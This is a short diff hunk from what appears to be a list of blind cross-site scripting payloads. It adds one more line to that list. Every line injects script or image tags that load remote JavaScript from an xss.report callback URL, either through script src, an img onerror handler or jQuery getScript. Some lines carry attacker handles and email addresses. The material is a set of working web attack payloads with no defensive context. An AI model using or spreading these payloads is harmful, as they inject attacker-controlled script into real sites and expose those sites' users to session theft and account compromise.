@@ -55,6 +55,7 @@ ibrahim'"<script src=https://xss.report/c/hnterx?39></script>
 ibro%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3E%3C%2Fscript%3E
 \"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/hnterx?42'">
 <p><img src="https://xss.report/c/hnterx?43" border="0" />--&gt;</p>
+zer0_sec=1"><script/src=//xss.report/c/hnterx?mail/@gmail.com
 <script>$.getScript("https://xss.report/c/hnterx?45")</script>
 zer0_sec 1"><script src="https://xss.report/c/hnterx?47"></script>@ibro1337@gmail.com
 ibro1337@gmail.com"><script src="https://xss.report/c/hnterx?48"></script>
